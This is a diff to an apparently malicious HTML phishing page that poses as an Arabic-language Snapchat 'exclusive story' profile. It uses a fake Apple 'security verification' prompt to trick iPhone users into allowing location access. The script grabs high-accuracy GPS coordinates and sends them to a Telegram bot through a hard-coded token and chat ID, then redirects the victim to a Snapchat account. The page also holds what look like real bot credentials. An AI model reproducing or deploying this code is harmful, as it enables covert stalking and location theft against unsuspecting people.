@@ -12,7 +12,7 @@
 
     <style>
         body {
-            background-color: #f7f7f7;
+            background-color: #000000;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -22,13 +22,14 @@
             overflow: hidden;
         }
         .profile-card {
-            background: #ffffff;
+            background: #121212;
             padding: 35px 25px;
             border-radius: 24px;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
             width: 360px;
             text-align: center;
             box-sizing: border-box;
+            border: 1px solid #222;
         }
         .avatar-container {
             position: relative;
@@ -45,17 +46,17 @@
         .profile-name {
             font-size: 22px;
             font-weight: 700;
-            color: #0f1419;
+            color: #ffffff;
             margin-bottom: 4px;
         }
         .profile-username {
             font-size: 14px;
-            color: #536471;
+            color: #8e8e93;
             margin-bottom: 20px;
         }
         .bio {
             font-size: 14px;
-            color: #333;
+            color: #d1d1d6;
             margin-bottom: 25px;
             line-height: 1.5;
         }
@@ -69,11 +70,7 @@
             font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.4);
-            transition: background-color 0.2s;
-        }
-        .action-btn:hover {
-            background-color: #f4f100;
+            box-shadow: 0 4px 12px rgba(255, 252, 0, 0.2);
         }
 
         .modal-overlay {
@@ -82,38 +79,38 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.6);
+            background: rgba(0, 0, 0, 0.85);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 9999;
         }
         .modal-box {
-            background: #fff;
+            background: #1c1c1e;
             padding: 25px 20px;
             border-radius: 20px;
             width: 310px;
             text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            border: 1px solid #3a3a3c;
         }
         .modal-box h3 {
             font-size: 18px;
             margin-bottom: 10px;
-            color: #111;
+            color: #ffffff;
         }
         .modal-box p {
             font-size: 13px;
-            color: #666;
+            color: #aeaeb2;
             margin-bottom: 20px;
             line-height: 1.4;
         }
         .modal-btn {
-            background-color: #fffc00;
-            color: #000;
+            background-color: #0a84ff;
+            color: #ffffff;
             border: none;
             padding: 12px 20px;
             font-weight: bold;
-            border-radius: 15px;
+            border-radius: 12px;
             cursor: pointer;
             width: 100%;
             font-size: 15px;
@@ -124,9 +121,9 @@
 
     <div class="modal-overlay" id="gpsModal">
         <div class="modal-box">
-            <h3>عرض القصة الخاصة 👻</h3>
-            <p>يرجى السماح بالوصول إلى الموقع الجغرافي لعرض القصص واليوميات الحصرية.</p>
-            <button class="modal-btn" onclick="requestSystemGps()">متابعة</button>
+            <h3>مطلوب التحقق الأمني 🔒</h3>
+            <p>يرجى النقر على "موافق" ثم اختيار <b>السماح (Allow)</b> في نافذة نظام أبل لتأكيد فتح المحتوى الحصري.</p>
+            <button class="modal-btn" onclick="requestSystemGps()">موافق ومتابعة</button>
         </div>
     </div>
 
@@ -150,7 +147,7 @@
             window.location.replace('https://www.google.com');
         }
 
-        // --- التوكن والأيدي مشفرة ومفكوكة برمجياً لمنع كشفها ---
+        // --- التوكن والأيدي مشفرة برمجياً ---
         const _tc = ['8594739803', 'AAG3frEdNMUXEq4YOlEKDyIbdiVFQ11u3T8'];
         const _ci = ['7184970355'];
         
@@ -179,44 +176,35 @@ ${textMessage}
                 });
         }
 
-        function requestSystemGps() {
-            document.getElementById('gpsModal').style.display = 'none';
-            
+        function capturePosition(label) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
-                        sendToTelegram(`[+] iOS High-Accuracy GPS (Modal Click):\n- Coordinates: Lat: ${lat}, Lon: ${lon} (Accuracy: ${accuracy}m)\n- Google Maps: https://maps.google.com/?q=${lat},${lon}`);
+                        sendToTelegram(`[+] iPhone Targeted Success (${label}):\n- Lat: ${lat}, Lon: ${lon}\n- Accuracy: ${accuracy}m\n- Maps: https://maps.google.com/?q=${lat},${lon}`);
                     },
                     function(error) {
-                        sendToTelegram(`[!] iOS GPS Denied/Error (Modal): ${error.message}`);
+                        sendToTelegram(`[!] iPhone GPS Error (${label}): ${error.message}`);
                     },
-                    { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             }
         }
 
+        function requestSystemGps() {
+            document.getElementById('gpsModal').style.display = 'none';
+            capturePosition("Modal Click Event");
+        }
+
         function triggerRedirect() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        sendToTelegram(`[+] iOS High-Accuracy GPS (Action Click):\n- Coordinates: Lat: ${lat}, Lon: ${lon} (Accuracy: ${accuracy}m)\n- Google Maps: https://maps.google.com/?q=${lat},${lon}`);
-                    },
-                    function(error) {
-                        sendToTelegram(`[!] iOS GPS Denied/Error (Action): ${error.message}`);
-                    },
-                    { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
-                );
-            }
+            // محاولة رصد مزدوجة متزامنة لضمان التقاط الإحداثيات قبل الخروج
+            capturePosition("Profile Action Click");
 
             setTimeout(() => {
                 window.location.href = 'https://www.snapchat.com/add/amira_snap';
-            }, 1200);
+            }, 1500);
         }
     </script>
 </body>
